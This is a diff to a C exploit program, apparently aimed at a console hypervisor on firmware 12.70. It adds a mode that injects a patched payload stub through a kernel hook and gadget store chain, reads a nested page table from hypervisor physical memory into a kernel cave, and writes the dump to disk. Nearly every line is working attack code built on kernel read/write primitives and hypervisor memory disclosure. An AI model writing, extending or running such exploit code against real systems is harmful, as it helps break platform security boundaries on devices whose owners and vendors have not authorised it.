@@ -19,10 +19,18 @@
 #ifdef AP_VMCB_RW_1270
 #include "break_hv_payload/vmcb_rw_probe.h"
 #endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+#include "break_hv_payload/npt_table_dump.h"
+#endif
 
 #if defined(AP_OWNED_RESUME_1270) && !defined(FIXED_AP_PREP_ONLY_1270) && \
     !defined(AP_OWNED_RESUME_REENABLE_AFTER_KP_1270)
 #error "The owned resume carrier KP'd on 12.70; do not rebuild the full test unchanged"
+#endif
+
+#if defined(AP_NPT_TABLE_DUMP_1270) && !defined(FIXED_AP_PREP_ONLY_1270) && \
+    !defined(AP_NPT_DUMP_REENABLE_AFTER_KP_1270)
+#error "The 4 KiB NPT table dump KP'd on 12.70; do not rebuild the full test unchanged"
 #endif
 
 #define FW_1270             0x12700000U
@@ -42,7 +50,14 @@
 #define CARRIER_PA          0x3ffff000ULL
 #endif
 #define AP_MARKER           0x1270A9E17E5E0002ULL
-#ifdef AP_VMCB_RW_1270
+#ifdef AP_NPT_TABLE_DUMP_1270
+#define NPT_TABLE_PA        0x62a81000ULL
+#define NPT_DUMP_OFF        0x1000ULL
+#define NPT_DUMP_BYTES      4096U
+#define STUB_BYTES          75U
+#define STUB_QWORDS         10U
+#define PROBE_STEM          "fixed-ap-nptdump"
+#elif defined(AP_VMCB_RW_1270)
 #define AP_RW_ENTERED       0x1270A9E17E5E0001ULL
 #define AP_RW_BAD           0x1270A9E17E5E0003ULL
 #define VMCB_PA            0x62a57000ULL
@@ -53,8 +68,29 @@
 #define HV_LOADER_PA        0x62800000ULL
 #define HV_HEAP_PTR_OFF     0x83028ULL
 #define HV_PCPUS_PTR_OFF    0x82a60ULL
+#ifdef AP_HV_NPT_ENTRY_1270
+#ifndef NPT_READ_PA_1270
+#error "NPT_READ_PA_1270 must name the physical qword to read"
+#endif
+#define HV_READ_PA          NPT_READ_PA_1270
+#define PROBE_STEM          "fixed-ap-nptentry"
 #ifdef AP_HV_DUAL_READ_1270
-#ifdef AP_HV_VMCB_FIELDS_1270
+#ifndef NPT_READ_PA2_1270
+#error "NPT_READ_PA2_1270 must name the second physical qword"
+#endif
+#define HV_READ_PA2         NPT_READ_PA2_1270
+#define STUB_BYTES          94U
+#define STUB_QWORDS         12U
+#else
+#define STUB_BYTES          68U
+#define STUB_QWORDS         9U
+#endif
+#elif defined(AP_HV_DUAL_READ_1270)
+#ifdef AP_HV_VMCB15_FIELDS_1270
+#define HV_READ_PA          0x62a75090ULL
+#define HV_READ_PA2         0x62a750b0ULL
+#define PROBE_STEM          "fixed-ap-vmcb15fields"
+#elif defined(AP_HV_VMCB_FIELDS_1270)
 #define HV_READ_PA          0x62a57090ULL
 #define HV_READ_PA2         0x62a570b0ULL
 #define PROBE_STEM          "fixed-ap-vmcbfields"
@@ -105,6 +141,11 @@ static char output_path[128];
 static uint8_t ap_stub[STUB_QWORDS * 8];
 static uint64_t carrier_pml4e_addr, carrier_pml4e_original;
 static int carrier_map_changed;
+#ifdef AP_NPT_TABLE_DUMP_1270
+static uint8_t npt_dump_before[NPT_DUMP_BYTES];
+static uint8_t npt_dump_after[NPT_DUMP_BYTES];
+static int npt_dump_armed;
+#endif
 #ifdef AP_OWNED_RESUME_1270
 static carrier1270_t owned_carrier;
 static uint8_t owned_carrier_before[STUB_QWORDS * 8];
@@ -121,7 +162,7 @@ static int append_store(kh_chain_t *chain, uint64_t dst, uint64_t value)
          kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX) == 0 ? 0 : -1;
 }
 
-#ifdef AP_VMCB_RW_1270
+#if defined(AP_VMCB_RW_1270) || defined(AP_NPT_TABLE_DUMP_1270)
 static int patch_token(uint64_t token, uint64_t value)
 {
   unsigned matches = 0;
@@ -137,7 +178,18 @@ static int patch_token(uint64_t token, uint64_t value)
 
 static int build_stub(uint64_t oracle, uint64_t vector)
 {
-#ifdef AP_VMCB_RW_1270
+#ifdef AP_NPT_TABLE_DUMP_1270
+  if (npt_table_dump_len != STUB_BYTES)
+    return -1;
+  memset(ap_stub, 0, sizeof(ap_stub));
+  memcpy(ap_stub, npt_table_dump, STUB_BYTES);
+  if (patch_token(0x1111111111111111ULL, kdldmap(NPT_TABLE_PA)) != 0 ||
+      patch_token(0x2222222222222222ULL,
+                  kdlsym(KERNEL_SYM_DATA_CAVE) + NPT_DUMP_OFF) != 0 ||
+      patch_token(0x3333333333333333ULL, oracle) != 0 ||
+      patch_token(0x4444444444444444ULL, vector) != 0)
+    return -1;
+#elif defined(AP_VMCB_RW_1270)
   if (vmcb_rw_probe_len != STUB_BYTES)
     return -1;
   memset(ap_stub, 0, sizeof(ap_stub));
@@ -245,7 +297,8 @@ static int read_qword(uint64_t addr, uint64_t *value)
   return kread(addr, value, sizeof(*value));
 }
 
-#if defined(AP_HV_READ_1270) || defined(AP_VMCB_RW_1270)
+#if defined(AP_HV_READ_1270) || defined(AP_VMCB_RW_1270) || \
+    defined(AP_NPT_TABLE_DUMP_1270)
 static int guest_maps_pa(uint64_t pmap, uint64_t va, uint64_t expected)
 {
   const uint64_t frame1g = 0x000fffffc0000000ULL;
@@ -264,6 +317,34 @@ static int guest_maps_pa(uint64_t pmap, uint64_t va, uint64_t expected)
   if (find_pte(pmap, va, &pte) == UINT64_MAX || !(pte & 1))
     return -5;
   return ((pte & frame4k) | (va & 0xfffULL)) == expected ? 0 : -6;
+}
+#endif
+
+#ifdef AP_NPT_TABLE_DUMP_1270
+static int all_zero(const uint8_t *buf, size_t len)
+{
+  for (size_t i = 0; i < len; ++i)
+    if (buf[i] != 0)
+      return 0;
+  return 1;
+}
+
+static int save_npt_dump(void)
+{
+  size_t len = strlen(output_path);
+  if (len < 4 || strcmp(output_path + len - 4, ".txt") != 0)
+    return -1;
+  char bin_path[sizeof(output_path)];
+  memcpy(bin_path, output_path, len - 4);
+  memcpy(bin_path + len - 4, ".bin", 5);
+  int fd = open(bin_path, O_WRONLY | O_CREAT | O_EXCL, 0600);
+  if (fd < 0)
+    return -2;
+  ssize_t written = write(fd, npt_dump_after, sizeof(npt_dump_after));
+  int synced = written == (ssize_t)sizeof(npt_dump_after) ? fsync(fd) : -1;
+  int closed = close(fd);
+  return written == (ssize_t)sizeof(npt_dump_after) &&
+         synced == 0 && closed == 0 ? 0 : -3;
 }
 #endif
 
@@ -315,6 +396,9 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
                    uint64_t authid, int restore_cave)
 {
   int disarm = 0, gate = 0, head = 0, big = 0, marker = 0;
+#ifdef AP_NPT_TABLE_DUMP_1270
+  int npt_restore = 0;
+#endif
   if (armed) {
     intptr_t thread = kernel_get_proc_thread(getpid(), -1);
     uint64_t row_thread = 0;
@@ -332,6 +416,17 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
     head = kwrite(cave, saved_head, sizeof(saved_head));
     big = kwrite(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big));
     marker = kwrite(cave + KH_OFF_USER, saved_head + KH_OFF_USER, 8);
+#ifdef AP_NPT_TABLE_DUMP_1270
+    if (npt_dump_armed) {
+      uint8_t verify[NPT_DUMP_BYTES];
+      if (kwrite(cave + NPT_DUMP_OFF, npt_dump_before,
+                 sizeof(npt_dump_before)) != 0 ||
+          kread(cave + NPT_DUMP_OFF, verify, sizeof(verify)) != 0 ||
+          memcmp(verify, npt_dump_before, sizeof(verify)) != 0)
+        npt_restore = -1;
+      npt_dump_armed = 0;
+    }
+#endif
   }
   int carrier_map = restore_carrier_map();
 #ifdef AP_OWNED_RESUME_1270
@@ -360,8 +455,14 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
 #endif
   klog("AFP1270,1,cleanup,disarm=%d,gate=%d,head=%d,big=%d,marker=%d,carrier_map=%d,auth=%d\n",
        disarm, gate, head, big, marker, carrier_map, auth);
+#ifdef AP_NPT_TABLE_DUMP_1270
+  klog("AFP1270,1,npt-cleanup,restore=%d\n", npt_restore);
+#endif
   return disarm == 0 && gate == 0 && head == 0 && big == 0 &&
          marker == 0 && carrier_map == 0 && auth == 0
+#ifdef AP_NPT_TABLE_DUMP_1270
+         && npt_restore == 0
+#endif
 #ifdef AP_OWNED_RESUME_1270
          && carrier == 0 && release == 0
 #endif
@@ -413,6 +514,12 @@ int main(void)
       || kread(cave + KH_OFF_USER + 16, rw_before, sizeof(rw_before)) != 0 ||
       rw_before[0] != 0 || rw_before[1] != 0 ||
       rw_before[2] != 0 || rw_before[3] != 0 || rw_before[4] != 0
+#endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+      || guest_maps_pa(pmap, kdldmap(NPT_TABLE_PA), NPT_TABLE_PA) != 0 ||
+      kread(cave + NPT_DUMP_OFF, npt_dump_before,
+            sizeof(npt_dump_before)) != 0 ||
+      !all_zero(npt_dump_before, sizeof(npt_dump_before))
 #endif
       ) {
     klog("RSH1270,1,stop,stage=preflight,target=0x%016" PRIx64
@@ -545,6 +652,9 @@ int main(void)
 #ifdef AP_VMCB_RW_1270
            ",vmcb_pa=0x%016" PRIx64
 #endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+           ",npt_table_pa=0x%016" PRIx64
+#endif
            ",stub_bytes=%u,stores=%u,chain_bytes=%zu\n",
            (int)getpid(), target, stock_vector, cr3, carrier_va,
            carrier_first8,
@@ -556,6 +666,9 @@ int main(void)
 #endif
 #ifdef AP_VMCB_RW_1270
            (uint64_t)VMCB_PA,
+#endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+           (uint64_t)NPT_TABLE_PA,
 #endif
            STUB_BYTES, STUB_QWORDS, store_chain.len);
   if (save_line(line, 1) != 0) {
@@ -674,6 +787,9 @@ int main(void)
     return 16;
   }
 
+#ifdef AP_NPT_TABLE_DUMP_1270
+  npt_dump_armed = 1;
+#endif
   if (save_line("ready,enter-rest-mode\n", 0) != 0) {
     cleanup(&hook, 1, cave, authid, 1);
     return 17;
@@ -747,7 +863,16 @@ int main(void)
                     rw_values[3] == 0x1270127012701270ULL &&
                     rw_values[4] == rw_values[2];
 #endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+  int dump_read = fired && ap_entered ?
+                  kread(cave + NPT_DUMP_OFF, npt_dump_after,
+                        sizeof(npt_dump_after)) : -1;
+#endif
   int cleanup_result = cleanup(&hook, !fired, cave, authid, 1);
+#ifdef AP_NPT_TABLE_DUMP_1270
+  int dump_saved = dump_read == 0 && cleanup_result == 0 ?
+                   save_npt_dump() : -1;
+#endif
   snprintf(line, sizeof(line),
            "result,bp=0x%016" PRIx64 ",ap=0x%016" PRIx64
 #ifdef AP_HV_READ_1270
@@ -763,6 +888,9 @@ int main(void)
            ",reserved_restored=0x%016" PRIx64
            ",rw_read=%d,rw_verified=%d"
 #endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+           ",dump_read=%d,dump_saved=%d"
+#endif
            ",bp_fired=%d,ap_entered=%d,resume_gap=%d,cleanup=%d\n",
            marker, ap_marker,
 #ifdef AP_HV_READ_1270
@@ -774,6 +902,9 @@ int main(void)
 #ifdef AP_VMCB_RW_1270
            rw_values[0], rw_values[1], rw_values[2], rw_values[3],
            rw_values[4], rw_read, rw_verified,
+#endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+           dump_read, dump_saved,
 #endif
            fired, ap_entered, saw_resume_gap,
            cleanup_result);
@@ -790,6 +921,9 @@ int main(void)
 #endif
 #ifdef AP_VMCB_RW_1270
          && rw_verified
+#endif
+#ifdef AP_NPT_TABLE_DUMP_1270
+         && dump_read == 0 && dump_saved == 0
 #endif
          ? 0 : 20;
 }
